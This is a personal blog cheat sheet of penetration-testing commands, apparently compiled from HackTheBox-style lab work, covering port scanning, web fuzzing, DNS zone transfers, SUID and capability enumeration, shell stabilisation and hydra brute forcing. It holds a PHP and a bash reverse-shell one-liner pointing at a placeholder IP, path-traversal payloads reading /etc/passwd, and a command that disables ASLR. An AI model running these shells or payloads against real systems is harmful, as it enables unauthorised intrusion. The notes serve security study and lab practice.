---
layout: single
title: Commands for penetration tests - CiberSecurity
excerpt: "These are some of the commands that I use when doing a penetration test."
date: 2022-11-14
classes: wide
header:
  teaser: /assets/images/CiberSecurity-logo.png
  teaser_home_page: true
  icon: /assets/images/CiberSecurity-logo-small-copia.png
categories:
  - CiberSecurity
tags:  
  - InfoSec
  - Ethical Hacking
  - CiberSecurity
---
## Virtual hosting
`wfuzz -H "Host: FUZZ.mentorquotes.htb" --hc 302,400 -t 50 -H "User-Agent: DEDSEC" -c -z file,"/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt" http://mentorquotes.htb/`
## WEBpages
https://gtfobins.github.io/ : userfull to find scalation
https://crackstation.net/ : crack the hashes
https://cve.mitre.org/: Web de CVEs
## PHP
Send a reverse shell to your local machine
```
<?php
system("bash -c 'bash -i >& /dev/tcp/IP_YOUR_LOCAL_MACHINE/443 0>&1'")
?>
```
## LINUX
`md5sum`: validar la integridad de los datos (comparar el has entre dos archivos, si el has es el mismo, es el mismo archivo)
`smbclient -L IP -N`
`smbmap -H IP`
`oathtool`: tool for the key of second factor authentications
`echo $IFS`: nos da un espacio en blanco muy util por si no funciona el espacio en la maquina objetivo
`users of 'adm' group are able to see logs`
`pwncat-cs`: herramienta para hacer puertos facil
`cat exploit | tr -d '/n' | xclip -sel clip`: remove the las '/n' and copy it to the clipboard
`curl -s -X GET "IP" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5" | jq`: GET CURL with Auth Token
`find / \-name user.txt -o -name root.txt 2>/dev/null | xargs cat `
`uname -a`: Kernel version
`openssl s_client -connect 10.10.10.162:443`
`lsb_release -a`
`which mkt | cat -l bash`
`bash -c 'bash -i >& /dev/tcp/IP/443 0>&1'`
`carefull with fail2ban`: program to block the conexions done with python
`$((16#$port))`
`$((0x$port))`
`sort -u`: To order and remove the repeat ones
` "PORTS" | sort -u | while read port; do echo "[+] Puerto $port: $((0x$port)))"; done`
`DOMAIN_NAME/index.php?page=....//....//....//....//....//....//....//....//....//etc/passwd`
`curl -s -X GET "DOMAIN_NAME/index.php?page=../../../../../../../../../etc/passwd" --path-as-is`
`dig @IP DOMAIN_NAME axfr`
`dig @IP DOMAIN_NAME ns`
`dig @IP DOMAIN_NAME mx`

- -axfr: Zone Transfer Attack
- -ns: Name Servers
- -mx: Email Servers

## Local File Inclusion
`nslookup`
- Used to see if there is virtual Hosting. If there is virtual hosting, the Ip and the Domain Name could have different webapp

`gobuster dir -u http://trick.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200`

- -t: number of threads
- -w: The dictionary to use
- -u: The URL
`gobuster dir -u http://trick.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x txt,php,html`
- -e: Extensions that we are going to look for

`sed 's/CHARACTER_TO_SUBSTITUDE/CHARACTER_TO_PUT/g'`
- The "g" at the end is to apply this substitution to all the characters

`whoami`

`id`

`sudo su`

`/etc/group`

`/etc/passwd`

`/etc/shells`

`/etc/shadow`

`/var/log`

`/etc/login.defs`

`/proc/net/tcp`

`/proc/sched_debug`

`cat /proc/sys/kernel/randomize_va_space`: To see if the memory security guards are enabled
- 2: Memory protection is enabled
- 0: Memory protection is disabled (to disable the memory protection use `echo 0 > /proc/sys/kernel/randomize_va_space`)

`chgrp GROUP FILE_NAME`: Change the group of a file or directory

`chown USER FILE`: Change the owner of a file or directory

`chown USER:GROUP`: Change the owner and the group of a file or directory

`chmod 1xxx DIRECTORY`: Sticky bit

`chmod o+t DIRECTORY`: Sticky bit

`useradd USER -s /bin/bash -d /home/USER_NAME"`
- -s: To choose the shell
- -d: Personal directory of the user

`groupadd GROUP`: Create a group

`usermod -a -G GROUP USER`: Add a User to a group

`echo $!`: Outputs the status code of the last command

`2>/dev/null`: Not show the stderr

`&>/dev/null`: Not show the stderr and the stdout

`&`: When "&" is at the end of the line, it means that it runs the command on the background

`& disown`: When "& disown" is at the end of the line, it means that it runs the command on the background and it does not depend on any other process (it is possible to exit the terminal)

`which "COMMAND"`: Outputs the root PATH

`command -v "COMMAND"`: Outputs the root PATH

`pwd`: Outputs the actual PATH

`grep "WORD_TO_SEARCH" -n`
- -n: Outputs the line number where the word is

`setcap cap_setuid+ep FILE`: Set capabilities

`getcap -r / 2>/dev/null`: Get all the capabilities of the system

`hostname -I`: List the IPs of the system

`awk '{print $1}'`: Prints the first argument
- Example: `hostname -I | awk '{print $1}'` -> This will print the first IP

`awk 'NR==2'`: Prints the second line
- Example: `cat /etc/passwd | awk 'NR==2'` -> This will print the second line

`cut -d  '/' -f 1`: The  '/' is the delimiter and the -f indicates that the output is the field 1

`echo -e`
- -e indicates  that the 'echo' command is going to recognize the special characters such as the "\n"

`ssh-keygen`: generates a private ssh key and a public ssh key

`tail -n 1`: We output the last line
- cat /etc/hosts | tail -n 1

`sudo pacman -Syu`: Upgrade the system in arch

`find / -name FILE_NAME 2>/dev/null`

`find / -group GROUP 2>/dev/null`

`find / -group GROUP -type f 2>/dev/null`: Type FILE

`find / -group GROUP -type d 2>/dev/null`: Type DIRECTORY

`find / -user root -writable 2>/dev/null`: Search for root files that are writable

`find / -user root -executable -type f 2>/dev/null`: Search for root files that are executable

## ENVIRONMENT VARIABLES
`$PATH`

`$HOME`

`$SHELL`

## SUID/SGID AND OTHER PERMISSIONS
`chmod 4xxx FILE`: Give permission SUID

`chmod u+s FILE`: Give permission SUID

`chmod 2xxx FILE`: Give permission SGUID

`chmod g+s FILE`: Give permission SGUID

`find / -type f -perm -4000 2>/dev/null`: This is used to find files that has the permission SUID

`find / -type f -perm -2000 2>/dev/null`: This is used to find files that has the permission SGID

`lsattr FILE_NAME`: List the advanced permissions

`chattr +i FILE_NAME`: Add the inmutable bit to the file (Advanced permission)
## RECONNAISSANCE
### NMAP

`nmap -p- --open -T5 -v -n IP`

`nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn "IP" -oG allPorts`
- -p-: Scan all ports
- -sS: Sync scan

`nmap -sC -sV -p"PORTS" "IP" -----> nmap -sCV -p"PORTS" "IP" -oN targeted`

`nmap --script http-enum -p80 "IP" -oN webScan`

`sudo nmap -sU --top-ports 100 --open -v -n 10.10.11.193 -oG top100udp` : UDP Scann on the 100 most common ports
`snmpwalk -v2c -c internal 10.10.11.193`
`snmpbulkwalk -v2c -c internal 10.10.11.193`: faster scann than snmpwalk



`cewl -w dictionary.txt http://ip`
- This command generates a dictionary based on the words of the content of the web page

`ps -faux`: List running process

`updatedb`

### FUZZING
#### GOBUSTER
`./gobuster dir -u URL -w DICTIONARY -t 200`

#### WFUZZ
`wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt URL/FUZZ/`
- -L: redirect
- --hc: Hide Code
- --sc: Show CodeÇ
- --hw: hide word
- -t: number of threats
- w: dictionary
`Payload type list`

`wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,html-txt-php URL/FUZZ.FUZ2Z`
- -z list,html-txt-php: Extensions
`wfuzz -c -t 200 -z range,1-2000 'URL/id=FUZZ'`

#### FUFF

#### PASSIVE TOOLS

##### PHONEBOOK.cz

#### GOOGLE DORKS

- site:DOMAIN

- pentest-tools.com

#### METADATA FROM DOCS

`exiftool doc.pdf`: Extract the metadata from the document

# Get a TTY

`script /dev/null -c bash`

CTRL + Z

`stty raw -echo; fg`

`reset xterm`

# Useful commands:

`route -n`

`pwdx processId`: See the route of the processId

`hostname -I`

`arp-scan -I ens33 --localnet`

`timeout 1 OTHER_COMMAND`: this command takes 1 second to execute at most

`masscan`: escano de puertos y herramienta profesional muy potente para auditar empresas

`kill %`: kill the process that is at the back

# Enumeration
`hydra -l user -P passwordsFile.txt ftp://IP -t 15`
- -l: indicates the user
- -t: number of threads
